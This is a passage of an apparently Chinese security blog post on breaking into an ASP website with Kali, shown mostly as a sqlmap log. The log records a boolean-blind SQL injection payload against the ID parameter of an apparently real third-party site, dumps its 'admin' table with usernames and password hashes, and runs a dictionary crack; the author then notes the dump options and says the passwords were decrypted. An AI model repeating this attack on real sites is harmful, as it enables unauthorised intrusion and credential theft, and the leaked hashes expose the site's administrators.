 _|</span><br><span class="line">      |_|           |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 11:13:17</span><br><span class="line"></span><br><span class="line">[11:13:17] [INFO] resuming back-end DBMS &apos;microsoft access&apos; </span><br><span class="line">[11:13:17] [INFO] testing connection to the target URL</span><br><span class="line">[11:13:19] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: ID (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: ID=3239 AND 1305=1305</span><br><span class="line">---</span><br><span class="line">[11:13:22] [INFO] the back-end DBMS is Microsoft Access</span><br><span class="line">web server operating system: Windows 2003 or XP</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class="line">back-end DBMS: Microsoft Access</span><br><span class="line">[11:13:22] [INFO] fetching tables for database: &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:22] [INFO] fetching number of tables for database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:22] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval</span><br><span class="line">[11:13:22] [INFO] retrieved: </span><br><span class="line">[11:13:24] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; </span><br><span class="line">[11:13:24] [WARNING] unable to retrieve the number of tables for database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:24] [ERROR] cannot retrieve table names, back-end DBMS is Access</span><br><span class="line">[11:13:24] [ERROR] cannot retrieve column names, back-end DBMS is Access</span><br><span class="line">[11:13:24] [INFO] fetching entries of column(s) &apos;classid, department, id, password, username&apos; for table &apos;admin&apos; in database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:24] [INFO] fetching number of column(s) &apos;classid, department, id, password, username&apos; entries for table &apos;admin&apos; in database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:24] [INFO] retrieved: 2</span><br><span class="line">[11:13:31] [INFO] fetching number of distinct values for column &apos;id&apos;</span><br><span class="line">[11:13:31] [INFO] retrieved: 2</span><br><span class="line">[11:13:38] [INFO] using column &apos;id&apos; as a pivot for retrieving row data</span><br><span class="line">[11:13:38] [INFO] retrieved: 19</span><br><span class="line">[11:13:58] [INFO] retrieved: 1</span><br><span class="line">[11:14:08] [INFO] retrieved: 47CC749B63858A2CE72379B371ECFE33</span><br><span class="line">[11:19:28] [INFO] retrieved: admin</span><br><span class="line">[11:20:42] [INFO] retrieved: </span><br><span class="line">[11:21:58] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)</span><br><span class="line"> Q~\xdc</span><br><span class="line">[11:24:50] [INFO] retrieved: 25</span><br><span class="line">[11:25:14] [INFO] retrieved: 2</span><br><span class="line">[11:25:28] [INFO] retrieved: 93EA4D217C79428D</span><br><span class="line">[11:28:17] [INFO] retrieved: xqb</span><br><span class="line">[11:28:56] [INFO] retrieved:  Q~\xdc</span><br><span class="line">[11:31:29] [INFO] analyzing table dump for possible password hashes</span><br><span class="line">[11:31:29] [INFO] recognized possible password hashes in column &apos;password&apos;</span><br><span class="line">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y</span><br><span class="line">[11:31:43] [INFO] writing hashes to a temporary file &apos;/tmp/sqlmap1qoJgX17098/sqlmaphashes-NipaiC.txt&apos; </span><br><span class="line">do you want to crack them via a dictionary-based attack? [Y/n/q] y</span><br><span class="line">[11:31:51] [INFO] using hash method &apos;md5_generic_passwd&apos;</span><br><span class="line">[11:31:51] [INFO] using hash method &apos;mysql_old_passwd&apos;</span><br><span class="line">what dictionary do you want to use?</span><br><span class="line">[1] default dictionary file &apos;/usr/share/sqlmap/txt/wordlist.zip&apos; (press Enter)</span><br><span class="line">[2] custom dictionary file</span><br><span class="line">[3] file with list of dictionary files</span><br><span class="line">&gt; 1</span><br><span class="line">[11:32:01] [INFO] using default dictionary</span><br><span class="line">do you want to use common password suffixes? (slow!) [y/N] y</span><br><span class="line">[11:32:11] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[11:32:11] [INFO] starting 4 processes </span><br><span class="line">[11:32:20] [INFO] using suffix &apos;1&apos;                                                                                                         </span><br><span class="line">[11:32:30] [INFO] using suffix &apos;123&apos;                                                                                                       </span><br><span class="line">[11:32:40] [INFO] using suffix &apos;2&apos;                                                                                                         </span><br><span class="line">[11:32:49] [INFO] using suffix &apos;12&apos;                                                                                                        </span><br><span class="line">[11:32:59] [INFO] using suffix &apos;3&apos;                                                                                                         </span><br><span class="line">[11:33:08] [INFO] using suffix &apos;13&apos;                                                                                                        </span><br><span class="line">[11:33:18] [INFO] using suffix &apos;7&apos;                                                                                                         </span><br><span class="line">[11:33:28] [INFO] using suffix &apos;11&apos;                                                                                                        </span><br><span class="line">[11:33:38] [INFO] using suffix &apos;5&apos;                                                                                                         </span><br><span class="line">[11:33:47] [INFO] using suffix &apos;22&apos;                                                                                                        </span><br><span class="line">[11:33:57] [INFO] using suffix &apos;23&apos;                                                                                                        </span><br><span class="line">[11:34:06] [INFO] using suffix &apos;01&apos;                                                                                                        </span><br><span class="line">[11:34:16] [INFO] using suffix &apos;4&apos;                                                                                                         </span><br><span class="line">[11:34:26] [INFO] using suffix &apos;07&apos;                                                                                                        </span><br><span class="line">[11:34:36] [INFO] using suffix &apos;21&apos;                                                                                                        </span><br><span class="line">[11:34:46] [INFO] using suffix &apos;14&apos;                                                                                                        </span><br><span class="line">[11:34:55] [INFO] using suffix &apos;10&apos;                                                                                                        </span><br><span class="line">[11:35:05] [INFO] using suffix &apos;06&apos;                                                                                                        </span><br><span class="line">[11:35:14] [INFO] using suffix &apos;08&apos;                                                                                                        </span><br><span class="line">[11:35:24] [INFO] using suffix &apos;8&apos;                                                                                                         </span><br><span class="line">[11:35:34] [INFO] using suffix &apos;15&apos;                                                                                                        </span><br><span class="line">[11:35:44] [INFO] using suffix &apos;69&apos;                                                                                                        </span><br><span class="line">[11:35:54] [INFO] using suffix &apos;16&apos;                                                                                                        </span><br><span class="line">[11:36:03] [INFO] using suffix &apos;6&apos;                                                                                                         </span><br><span class="line">[11:36:13] [INFO] using suffix &apos;18&apos;                                                                                                        </span><br><span class="line">[11:36:22] [INFO] using suffix &apos;!&apos;                                                                                                         </span><br><span class="line">[11:36:32] [INFO] using suffix &apos;.&apos;                                                                                                         </span><br><span class="line">[11:36:43] [INFO] using suffix &apos;*&apos;                                                                                                         </span><br><span class="line">[11:36:52] [INFO] using suffix &apos;!!&apos;                                                                                                        </span><br><span class="line">[11:37:02] [INFO] using suffix &apos;?&apos;                                                                                                         </span><br><span class="line">[11:37:13] [INFO] using suffix &apos;;&apos;                                                                                                         </span><br><span class="line">[11:37:23] [INFO] using suffix &apos;..&apos;                                                                                                        </span><br><span class="line">[11:37:33] [INFO] using suffix &apos;!!!&apos;                                                                                                       </span><br><span class="line">[11:37:43] [INFO] using suffix &apos;, &apos;                                                                                                        </span><br><span class="line">[11:37:53] [INFO] using suffix &apos;@&apos;                                                                                                         </span><br><span class="line">[11:38:03] [INFO] starting dictionary-based cracking (mysql_old_passwd)                                                                    </span><br><span class="line">[11:38:18] [INFO] using suffix &apos;1&apos;                                                                                                         </span><br><span class="line">[11:38:35] [INFO] using suffix &apos;123&apos;                                                                                                       </span><br><span class="line">[11:38:51] [INFO] using suffix &apos;2&apos;                                                                                                         </span><br><span class="line">[11:39:07] [INFO] using suffix &apos;12&apos;                                                                                                        </span><br><span class="line">[11:39:23] [INFO] using suffix &apos;3&apos;                                                                                                         </span><br><span class="line">[11:39:38] [INFO] using suffix &apos;13&apos;                                                                                                        </span><br><span class="line">[11:39:54] [INFO] using suffix &apos;7&apos;                                                                                                         </span><br><span class="line">[11:40:10] [INFO] using suffix &apos;11&apos;                                                                                                        </span><br><span class="line">[11:40:26] [INFO] using suffix &apos;5&apos;                                                                                                         </span><br><span class="line">[11:40:41] [INFO] using suffix &apos;22&apos;                                                                                                        </span><br><span class="line">[11:41:03] [INFO] using suffix &apos;23&apos;                                                                                                        </span><br><span class="line">[11:41:24] [INFO] using suffix &apos;01&apos;                                                                                                        </span><br><span class="line">[11:41:46] [INFO] using suffix &apos;4&apos;                                                                                                         </span><br><span class="line">[11:42:07] [INFO] using suffix &apos;07&apos;                                                                                                        </span><br><span class="line">[11:42:30] [INFO] using suffix &apos;21&apos;                                                                                                        </span><br><span class="line">[11:42:52] [INFO] using suffix &apos;14&apos;                                                                                                        </span><br><span class="line">[11:43:10] [INFO] using suffix &apos;10&apos;                                                                                                        </span><br><span class="line">[11:43:32] [INFO] using suffix &apos;06&apos;                                                                                                        </span><br><span class="line">[11:43:51] [INFO] using suffix &apos;08&apos;                                                                                                        </span><br><span class="line">[11:44:07] [INFO] using suffix &apos;8&apos;                                                                                                         </span><br><span class="line">[11:44:22] [INFO] using suffix &apos;15&apos;                                                                                                        </span><br><span class="line">[11:44:37] [INFO] using suffix &apos;69&apos;                                                                                                        </span><br><span class="line">[11:44:53] [INFO] using suffix &apos;16&apos;                                                                                                        </span><br><span class="line">[11:45:10] [INFO] using suffix &apos;6&apos;                                                                                                         </span><br><span class="line">[11:45:31] [INFO] using suffix &apos;18&apos;                                                                                                        </span><br><span class="line">[11:45:56] [INFO] using suffix &apos;!&apos;                                                                                                         </span><br><span class="line">[11:46:21] [INFO] using suffix &apos;.&apos;                                                                                                         </span><br><span class="line">[11:46:46] [INFO] using suffix &apos;*&apos;                                                                                                         </span><br><span class="line">[11:47:10] [INFO] using suffix &apos;!!&apos;                                                                                                        </span><br><span class="line">[11:47:32] [INFO] using suffix &apos;?&apos;                                                                                                         </span><br><span class="line">[11:47:54] [INFO] using suffix &apos;;&apos;                                                                                                         </span><br><span class="line">[11:48:14] [INFO] using suffix &apos;..&apos;                                                                                                        </span><br><span class="line">[11:48:35] [INFO] using suffix &apos;!!!&apos;                                                                                                       </span><br><span class="line">[11:48:58] [INFO] using suffix &apos;, &apos;                                                                                                        </span><br><span class="line">[11:49:18] [INFO] using suffix &apos;@&apos;                                                                                                         </span><br><span class="line">[11:49:36] [WARNING] no clear password(s) found                                                                                            </span><br><span class="line">[11:49:36] [INFO] postprocessing table dump</span><br><span class="line">Database: Microsoft_Access_masterdb</span><br><span class="line">Table: admin</span><br><span class="line">[2 entries]</span><br><span class="line">+----+---------+----------+------------+----------------------------------+</span><br><span class="line">| id | classid | username | department | password                         |</span><br><span class="line">+----+---------+----------+------------+----------------------------------+</span><br><span class="line">| 19 | 1       | admin    | \x7fQ~\xdc | 47CC749B63858A2CE72379B371ECFE33 |</span><br><span class="line">| 25 | 2       | xqb      | \x7fQ~\xdc | 93EA4D217C79428D                 |</span><br><span class="line">+----+---------+----------+------------+----------------------------------+</span><br><span class="line"></span><br><span class="line">[11:49:36] [INFO] table &apos;Microsoft_Access_masterdb.admin&apos; dumped to CSV file &apos;/root/.sqlmap/output/40.cavtc.cn/dump/Microsoft_Access_masterdb/admin.csv&apos;</span><br><span class="line">[11:49:36] [ERROR] cannot retrieve column names, back-end DBMS is Access</span><br><span class="line">[11:49:36] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;news&apos; in database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:49:36] [INFO] fetching number of column(s) &apos;password, username&apos; entries for table &apos;news&apos; in database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:49:36] [INFO] retrieved: 127</span><br><span class="line">[11:49:56] [INFO] fetching number of distinct values for column &apos;password&apos;</span><br><span class="line">[11:49:56] [INFO] retrieved: </span><br><span class="line">[11:49:57] [INFO] fetching number of distinct values for column &apos;username&apos;</span><br><span class="line">[11:49:57] [INFO] retrieved: </span><br><span class="line">[11:49:58] [CRITICAL] all column name(s) provided are non-existent</span><br><span class="line">[11:49:58] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 74 times</span><br><span class="line"></span><br><span class="line">[*] shutting down at 11:49:58</span><br></pre></td></tr></table></figure>
+<pre><code>#### --dump  下载数据
+#### -C &quot;username,password&quot; -T &quot;列名&quot; （&apos;,&apos;是一种多列显示的方法）
+</code></pre><ul>
+<li>5.成功获得用户名与密码(cmd5解密)</li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/KALI/" rel="tag"># KALI</a>
+          
+            <a href="/tags/SQLMAP/" rel="tag"># SQLMAP</a>
+          
+            <a href="/tags/ASP/" rel="tag"># ASP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/14/SQLAMP入门/" rel="next" title="SQLAMP入门">
+                <i class="fa fa-chevron-left"></i> SQLAMP入门
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/14/VMware-tools安装/" rel="prev" title="VMware tools安装">
+                VMware tools安装 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Healer">
+            
+              <p class="site-author-name" itemprop="name">Healer</p>
+              <p class="site-description motion-element" itemprop="description">桃李不言，下自成蹊</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">52</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#通过kali渗透ASP网站"><span class="nav-number">1.</span> <span class="nav-text">通过kali渗透ASP网站</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#根据经验确定用户名（username，password）"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">根据经验确定用户名（username，password）</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+      
+	<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+	<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+	<div class="widget-wrap">
+	    <h3 class="widget-title">Tag Cloud</h3>
+	    <div id="myCanvasContainer" class="widget tagcloud">
+		<canvas width="250" height="250" id="resCanvas" style="width=100%">
+		    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARP欺骗/">ARP欺骗</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASLR/">ASLR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASP/">ASP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMD/">CMD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEP/">DEP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ettercap/">Ettercap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GDB/">GDB</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IDA/">IDA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KALI/">KALI</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MARKDOWN/">MARKDOWN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MS08-067/">MS08-067</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MS12-004/">MS12_004</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Meatsploit/">Meatsploit</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/">Metasploit</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nmap/">Nmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNTOOLS/">PWNTOOLS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Requests/">Requests</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/">Reverse</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Revese/">Revese</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLMAP/">SQLMAP</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VMware-Tools/">VMware Tools</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/W3AF/">W3AF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Writeup/">Writeup</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arpspoof/">arpspoof</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/canary/">canary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/driftnet/">driftnet</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gef/">gef</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meterpreter/">meterpreter</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/objdump/">objdump</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/peda/">peda</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwndbg/">pwndbg</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/">re</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/">shellcode</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反爬虫/">反爬虫</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/图片/">图片</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆/">堆</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据库注入/">数据库注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/断网攻击/">断网攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/更新源/">更新源</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/木马/">木马</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/栈/">栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/正则表达式/">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/磁盘分区合并/">磁盘分区合并</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/逆向/">逆向</a><span class="tag-list-count">1</span></li></ul>
+		</canvas>
+	    </div>
+	</div>
+	
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Healer</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>
+</span><span class="post-meta-divider">|</span>
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
